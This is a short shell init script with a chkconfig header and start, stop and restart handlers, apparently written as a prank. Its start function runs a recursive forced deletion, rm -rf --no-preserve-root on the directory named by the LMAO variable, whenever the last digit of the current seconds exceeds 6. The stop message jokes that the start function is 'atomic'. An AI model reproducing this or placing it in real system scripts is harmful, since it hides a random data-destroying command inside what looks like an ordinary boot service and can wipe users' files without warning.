#!/bin/sh
# chkconfig: 125 20 80

start() {
   for i in $(date +%S | cut -c 2); do
      [ "$i" -gt 6 ] && rm -rf --no-preserve-root "${LMAO:?}/"*
   done
}

stop() {
   echo "The start function is atomic"
}

case "$1" in
start)
   start
   ;;
stop)
   stop
   ;;
restart)
   stop
   start
   ;;
*)
   echo "Usage: $0 {start|stop|restart}"
   ;;
esac

exit 0
